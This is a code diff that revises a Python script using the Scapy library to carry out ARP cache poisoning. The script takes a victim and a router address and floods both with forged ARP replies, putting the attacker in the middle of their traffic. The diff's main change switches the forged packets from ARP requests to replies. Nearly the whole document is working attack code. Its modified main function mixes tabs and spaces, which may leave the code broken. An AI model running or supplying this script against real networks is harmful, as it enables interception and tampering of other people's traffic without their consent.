@@ -1,0 +1,70 @@
+--- scapysend.py	2014-05-19 15:22:44.970493429 -0500
++++ scapysend_mod.py	2014-05-19 15:19:39.378493455 -0500
+@@ -18,11 +18,15 @@
+ 
+ 
+ #allow user to input information about packet
+-def parse_args(v,r):
++def parse_args():
+ 	parser = argparse.ArgumentParser()
+-	parser.add_argument("-v","--VictimIP", help="Choose the victim IP address.")
+-	parser.add_argument("-r","--RouterIP", help= "Choose the router IP address")
++	parser.add_argument("-v","--victimIP", help="Choose the victim IP address.")
++	parser.add_argument("-r","--routerIP", help= "Choose the router IP address")
+ 	return parser.parse_args()
++def originalMAC(ip):
++    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
++    for s,r in ans:
++        return r[Ether].src
+ #automatically gathers the MAC addresses from local network machines when
+ #given IPs. Second line sends crafted ARP packet to IP address
+ def MACgrab(ip):
+@@ -36,16 +40,19 @@
+ # all packets destined for the victim to the attacker.The victim will send
+ # all packets destined for the router to the attacker. 
+ def poison(routerIP, victimIP, routerMAC, victimMAC):
+-	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+-	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
++#	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
++	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
++#	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
++	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+ #Keeps a low profile and reverses what we did with the poisoning. Sending 
+ # packets to the victim and router updating ARP tables to store accurate
+ # information about which IP address is linked to which MAC address.
+ def sendOut(routerIP,victimIP,routerMAC,victimMAC):
+-	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=50)
+-	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=50)
++#	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=50)
++	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=50)
++#	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=50)
++	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=50)
+ 	sys.exit("out...")
+-
+ #check to see if the usr is root
+ def main(args):
+ 	if os.geteuid() != 0:
+@@ -53,10 +60,11 @@
+ 	#Run the IPs given through the MACgrab() function which will ask those
+ 	#IP addresses for their MACs. will retry 3 times. if one or the other
+ 	#do not respond with a "is-at" ARP packet then will exit
+-	routerIP = args.routerIP
+-	victimIP = args.victimIP
+-	routerMAC = MACgrab(args.routerIP)
+-	victimMAC = MACgrab(args.victimIP)
++
++        routerIP = args.routerIP
++        victimIP = args.victimIP
++        routerMAC = originalMAC(args.routerIP)
++        victimMAC = originalMAC(args.victimIP)
+ 	if routerMAC == None:
+ 		sys.exit("Could not find router MAC address. Closing...")
+ 	if victimMAC == None:
+@@ -78,6 +86,4 @@
+ 	while 1:
+ 		poison(routerIP, victimIP, routerMAC, victimMAC)
+ 		time.sleep(1.5)	
+-	main(parse_args())
+-
+-
++main(parse_args())
